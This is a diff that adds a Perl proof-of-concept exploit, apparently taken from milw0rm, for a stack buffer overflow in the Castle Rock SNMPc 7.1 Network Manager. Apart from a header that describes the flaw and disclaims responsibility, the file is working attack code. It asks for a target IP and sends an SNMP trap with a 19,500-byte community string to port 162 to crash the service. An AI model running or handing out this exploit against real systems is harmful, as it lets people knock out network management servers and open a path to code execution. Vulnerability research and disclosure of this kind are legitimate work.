@@ -1,0 +1,63 @@
+#!usr/bin/perl -w
+
+################################################################################################################
+#    Stack-based buffer overflow in the Network Manager in Castle Rock Computing SNMPc 7.1 and
+#    earlier allows remote attackers to cause a denial of service (crash) or execute arbitrary code
+#    via a long community string in an SNMP TRAP packet.
+#
+#    Refer:
+#    http://web.nvd.nist.gov/view/vuln/detail?execution=e3s1
+#    http://www.securityfocus.com/bid/28990/discuss
+#
+#
+#    To run this exploit on MS Windows replace "#!usr/bin/perl -w" with "#!Installation_path_for_perl -w"
+#    (say #!C:/Program Files/Perl/bin/perl -w)
+#
+#     This was strictly written for educational purpose. Use it at your own risk.
+#    Author will not bare any responsibility for any damages watsoever.
+#
+#        Author:    Praveen Darshanam
+#        Email:    praveen[underscore]recker[at]sify.com
+#        Date:    11th November, 2008
+#
+#    NOTE:    Thanks to all my colleagues at iPolicy
+#            For reliable security solutions please visit http://www.ipolicynetworks.com/
+#
+##################################################################################################################
+
+use Net::SNMP;
+
+printf("Enter the IP Adress of Vulnerable SNMP Manager ");
+$host_vulnerable = <STDIN>;
+$port = 162;
+$community = "D" x 19500;
+
+($session, $error) = Net::SNMP->session(
+                                               -hostname      => $host_vulnerable,
+                                               -port          => $port,
+                                               -community     => $community,   # v1/v2c
+                                             -maxmsgsize    => 65535,
+                                        );
+ if (!defined($session))
+ {
+      printf("ERROR: %s.\n", $error);
+      exit 1;
+ }
+
+$ipaddress = "172.16.16.4";
+#Throwing an error without Agent so randomly assigned value to $ipaddress
+
+$result = $session->trap(
+                              -agentaddr       => $ipaddress,
+                           );
+
+if (!defined($result))
+{
+     printf("ERROR: %s.\n", $session->error);
+     $session->close;
+     exit 1;
+}
+
+$session->close;
+
+# milw0rm.com [2008-11-12]
